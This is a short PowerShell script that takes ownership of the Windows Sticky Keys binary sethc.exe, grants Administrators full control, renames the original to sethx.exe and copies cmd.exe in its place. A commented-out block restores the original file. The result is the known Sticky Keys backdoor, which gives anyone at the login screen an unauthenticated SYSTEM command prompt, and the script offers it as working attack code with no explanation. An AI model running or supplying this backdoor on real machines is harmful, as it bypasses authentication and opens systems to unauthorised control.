$path = "C:\Windows\System32\sethc.exe"
Get-Acl $path | Format-List 
# Change owner
takeown /A /F C:\Windows\System32\sethc.exe
Get-Acl $path | Select-Object Owner
# Add Full control permissions 
Cacls $path /e /p Administrators:f
# Cover file
Copy-Item C:\Windows\System32\sethc.exe C:\Windows\System32\sethx.exe
Remove-Item C:\Windows\System32\sethc.exe
Copy-Item C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

<#
Remove-Item C:\Windows\System32\sethc.exe
Copy-Item C:\Windows\System32\sethx.exe C:\Windows\System32\sethc.exe
#>
